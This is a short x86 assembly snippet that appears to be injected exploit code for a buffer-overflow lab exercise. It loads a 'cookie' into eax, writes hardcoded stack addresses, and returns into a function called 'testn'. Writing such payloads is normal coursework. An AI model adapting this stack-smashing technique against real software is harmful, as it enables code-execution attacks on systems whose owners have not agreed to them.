movl $0x19233537, %eax #cookie to eax
movl $0x8048dd1, %ebx #returning address to testn to ebx
movl %ebx, 0x55682f44 #store returning address in stack mem
movl %esp, %ebx
movl $1, %ebx # restore ebx value
movl $0xdeadbeef, %edx
movl %edx, 0x55682f64
movl $0x55682f44,%esp # stack pointer register points exact add
movl $0x8048f1d,0x55682f74
movl $0xf7fe8200,0x55682f48
movl $0x55685ff0,0x55682f70
ret
